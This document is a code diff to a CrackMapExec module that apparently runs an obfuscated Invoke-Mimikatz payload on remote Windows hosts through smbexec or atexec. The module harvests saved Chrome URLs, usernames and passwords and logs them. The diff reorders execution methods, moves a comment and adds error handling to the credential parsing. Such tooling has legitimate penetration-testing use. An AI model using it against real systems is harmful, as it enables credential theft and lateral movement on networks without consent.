@@ -64,25 +64,26 @@ class CMEModule:
         return create_ps_command(launcher)
 
     def payload(self, context, command):
+
+        '''
+        Since the chrome decryption feature is relatively new, I had to manully compile the latest Mimikatz version, 
+        update the base64 encoded binary in the Invoke-Mimikatz.ps1 script 
+        and apply a patch that @gentilkiwi posted here https://github.com/PowerShellMafia/PowerSploit/issues/147 for the newer versions of mimikatz to work when injected.
+
+        Here we call the updated PowerShell script instead of PowerSploits version
+        '''
+
         with open(get_ps_script('Invoke-Mimikatz.ps1'), 'r') as ps_script:
             return obfs_ps_script(ps_script.read())
 
     def on_admin_login(self, context, connection, launcher, payload):
-        connection.execute(launcher, methods=['atexec', 'smbexec'])
+        connection.execute(launcher, methods=['smbexec', 'atexec'])
         context.log.success('Executed launcher')
 
     def on_request(self, context, request, launcher, payload):
         if 'Invoke-Mimikatz.ps1' == request.path[1:]:
             request.send_response(200)
             request.end_headers()
-
-            '''
-            Since the chrome decryption feature is relatively new, I had to manully compile the latest Mimikatz version, 
-            update the base64 encoded binary in the Invoke-Mimikatz.ps1 script 
-            and apply a patch that @gentilkiwi posted here https://github.com/PowerShellMafia/PowerSploit/issues/147 for the newer versions of mimikatz to work when injected.
-
-            Here we call the updated PowerShell script instead of PowerSploits version
-            '''
 
             request.wfile.write(payload)
 
@@ -103,24 +104,27 @@ class CMEModule:
             buf = StringIO(data).readlines()
             creds = []
 
-            i = 0
-            while i < len(buf):
-                if ('URL' in buf[i]):
-                    url  = buf[i].split(':', 1)[1].strip()
-                    user = buf[i+1].split(':', 1)[1].strip()
-                    passw = buf[i+3].split(':', 1)[1].strip()
+            try:
+                i = 0
+                while i < len(buf):
+                    if ('URL' in buf[i]):
+                        url  = buf[i].split(':', 1)[1].strip()
+                        user = buf[i+1].split(':', 1)[1].strip()
+                        passw = buf[i+3].split(':', 1)[1].strip()
 
-                    creds.append({'url': url, 'user': user, 'passw': passw})
+                        creds.append({'url': url, 'user': user, 'passw': passw})
 
-                i += 1
+                    i += 1
 
-            if creds:
-                context.log.success('Found saved Chrome credentials:')
-                for cred in creds:
-                    context.log.highlight('URL: ' + cred['url'])
-                    context.log.highlight('Username: ' + cred['user'])
-                    context.log.highlight('Password: ' + cred['passw'])
-                    context.log.highlight('')
+                if creds:
+                    context.log.success('Found saved Chrome credentials:')
+                    for cred in creds:
+                        context.log.highlight('URL: ' + cred['url'])
+                        context.log.highlight('Username: ' + cred['user'])
+                        context.log.highlight('Password: ' + cred['passw'])
+                        context.log.highlight('')
+            except:
+                context.log.error('Error parsing Mimikatz output, please check log file manually for possible credentials')
 
             log_name = 'EnumChrome-{}-{}.log'.format(response.client_address[0], datetime.now().strftime("%Y-%m-%d_%H%M%S"))
             write_log(data, log_name)
